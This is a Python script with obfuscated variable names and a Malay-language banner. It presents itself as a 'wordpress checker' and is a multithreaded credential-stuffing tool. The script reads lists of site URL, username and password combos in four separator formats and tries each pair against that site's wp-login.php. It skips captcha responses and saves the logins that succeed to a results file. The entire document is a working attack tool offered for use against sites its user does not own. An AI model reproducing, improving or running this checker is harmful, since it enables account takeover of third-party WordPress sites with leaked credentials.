import requests #line:1
from concurrent .futures import ThreadPoolExecutor #line:2
import os #line:3
import platform #line:4
WHITE ="\033[97m"#line:7
GREEN ="\033[92m"#line:8
RED ="\033[91m"#line:9
RESET ="\033[0m"#line:10
def login_to_wordpress (OO00000OO0OOO0O00 ,OOOO0OOO0O0O0O000 ,O0OO0OO00O0O00O00 ):#line:12
    O0OO0OO0O00O0O00O =f"{OO00000OO0OOO0O00}/wp-login.php"if not OO00000OO0OOO0O00 .endswith ('/wp-login.php')else OO00000OO0OOO0O00 #line:13
    OO0OO000000000O00 ={'log':OOOO0OOO0O0O0O000 ,'pwd':O0OO0OO00O0O00O00 }#line:17
    try :#line:18
        O0O0O0OO00OO0O000 =requests .Session ()#line:19
        O0O0OO0O00000OO0O =O0O0O0OO00OO0O000 .post (O0OO0OO0O00O0O00O ,data =OO0OO000000000O00 ,timeout =10 ,allow_redirects =True )#line:20
        if not O0O0OO0O00000OO0O .text .strip ():#line:22
            return False #line:23
        if "captcha"in O0O0OO0O00000OO0O .text .lower ()or "please verify"in O0O0OO0O00000OO0O .text .lower ():#line:25
            return False #line:26
        if 'wp-admin'in O0O0OO0O00000OO0O .url and 'wp-login'not in O0O0OO0O00000OO0O .url :#line:28
            return True #line:29
        return False #line:31
    except requests .exceptions .RequestException :#line:33
        return False #line:34
def check_wordpress_logins (O00O000OO000000O0 ,OO00OO0O0O000OOO0 ,OO000OO00OO00OO0O ,O000OO0OO0OOO0000 ):#line:36
    OOOOOOO00O0OO0OO0 =set ()#line:37
    try :#line:39
        with open (O00O000OO000000O0 ,'r',encoding ="utf8",errors ="ignore")as OO000000OOO0OO00O :#line:40
            O0O0000OO0OO00OO0 =OO000000OOO0OO00O .readlines ()#line:41
        def O00O0OO0OOO00OOOO (O0O0OO00OOO00O0O0 ):#line:43
            O0O0OO00OOO00O0O0 =O0O0OO00OOO00O0O0 .strip ()#line:44
            if not O0O0OO00OOO00O0O0 or O0O0OO00OOO00O0O0 in OOOOOOO00O0OO0OO0 :#line:45
                return #line:46
            OOOOOOO00O0OO0OO0 .add (O0O0OO00OOO00O0O0 )#line:47
            try :#line:49
                if O000OO0OO0OOO0000 =='1':#line:50
                    O0O00O0OOOOO00O0O ,O00O0O00OO0OO0O00 =O0O0OO00OOO00O0O0 .split ('://',1 )#line:51
                    O00OOO0OO0OOO0O0O =f"{O0O00O0OOOOO00O0O}://{O00O0O00OO0OO0O00.split(':',1)[0]}"#line:52
                    O00O0O00OO0OO0O00 =O00O0O00OO0OO0O00 .split (':',1 )[1 ]#line:53
                    OOOOO0OOO0OOOO0O0 ,OO00O0O0000O0000O =O00O0O00OO0OO0O00 .split (':',1 )#line:54
                elif O000OO0OO0OOO0000 =='2':#line:55
                    O00OOO0OO0OOO0O0O ,OOOOO0OOO0OOOO0O0 ,OO00O0O0000O0000O =O0O0OO00OOO00O0O0 .split ('|',2 )#line:56
                elif O000OO0OO0OOO0000 =='3':#line:57
                    O00OOO0OO0OOO0O0O ,OOOOO0OOO0OOOO0O0 =O0O0OO00OOO00O0O0 .split ('#',1 )#line:58
                    OOOOO0OOO0OOOO0O0 ,OO00O0O0000O0000O =OOOOO0OOO0OOOO0O0 .split ('@',1 )#line:59
                elif O000OO0OO0OOO0000 =='4':#line:60
                    O00OOO0OO0OOO0O0O ,O00O0O00OO0OO0O00 =O0O0OO00OOO00O0O0 .split ('@',1 )#line:61
                    OOOOO0OOO0OOOO0O0 ,OO00O0O0000O0000O =O00O0O00OO0OO0O00 .split ('#',1 )#line:62
                    O00OOO0OO0OOO0O0O =O00OOO0OO0OOO0O0O .rstrip ('/wp-login.php')#line:63
                else :#line:64
                    print (f'{WHITE}[!] Invalid separator choice.{RESET}')#line:65
                    return #line:66
            except ValueError :#line:67
                print (f'{WHITE}[!] Invalid line format: {O0O0OO00OOO00O0O0}{RESET}')#line:68
                return #line:69
            OO0O00O0O00OO0O0O =login_to_wordpress (O00OOO0OO0OOO0O0O ,OOOOO0OOO0OOOO0O0 ,OO00O0O0000O0000O )#line:71
            if OO0O00O0O00OO0O0O :#line:73
                print (f"{WHITE}[{GREEN}+{WHITE}] {O00OOO0OO0OOO0O0O}/wp-login.php | user : {OOOOO0OOO0OOOO0O0} | password : {OO00O0O0000O0000O} [ {GREEN}SUCCESS LOGIN{WHITE} ]{RESET}")#line:74
                with open (OO00OO0O0O000OOO0 ,'a',encoding ="utf8")as O0O00OOO0000000OO :#line:75
                    O0O00OOO0000000OO .write (f"{O00OOO0OO0OOO0O0O}|{OOOOO0OOO0OOOO0O0}|{OO00O0O0000O0000O}\n")#line:76
            else :#line:77
                print (f"{WHITE}[{GREEN}+{WHITE}] {O00OOO0OO0OOO0O0O}/wp-login.php | user : {OOOOO0OOO0OOOO0O0} | password : {OO00O0O0000O0000O} [ {RED}BAD LOGIN{WHITE} ]{RESET}")#line:78
        with ThreadPoolExecutor (max_workers =OO000OO00OO00OO0O )as O0O00OO0OO0OO0OO0 :#line:80
            O0O00OO0OO0OO0OO0 .map (O00O0OO0OOO00OOOO ,O0O0000OO0OO00OO0 )#line:81
    except FileNotFoundError :#line:83
        print (f'{WHITE}[!] File {O00O000OO000000O0} not found.{RESET}')#line:84
    except Exception as OOOO0OOO00OOO00O0 :#line:85
        print (f'{WHITE}[!] Error reading file: {OOOO0OOO00OOO00O0}{RESET}')#line:86
if platform .system ()=="Windows":#line:89
    os .system ('cls')#line:90
else :#line:91
    os .system ('clear')#line:92
print (f"""
{WHITE}Helo selamat datang ke wordpress checker !
Created By : Alexithema 1337
Contact    : @avxxr00t{RESET}
""")#line:99
file_path =input (f"{WHITE}[+] Masukkan Files List : {RESET}")#line:101
result_file =input (f"{WHITE}[+] Masukkan Output Result : {RESET}")#line:102
max_threads =int (input (f"{WHITE}[+] Masukkan Thread ( max : 10 thread ) : {RESET}"))#line:103
print (f"""
{WHITE}[+] Choose Login Separator Nya sifu
[-] 1. Separator ":"   (https://example.com:username:password)
[-] 2. Separator "|"   (https://example.com|username|password)
[-] 3. Separator "#,@" (https://example.com#username@password)
[-] 4. Separator "@,#" (https://example.com/wp-login.php@username#password)
{RESET}""")#line:111
separator_choice =input (f"{WHITE}[+] Choose : {RESET}")#line:112
check_wordpress_logins (file_path ,result_file ,max_threads ,separator_choice )#line:114
print (f"\n{WHITE}[+] Selesai cek, hasil tersimpan di {result_file}{RESET}\n")
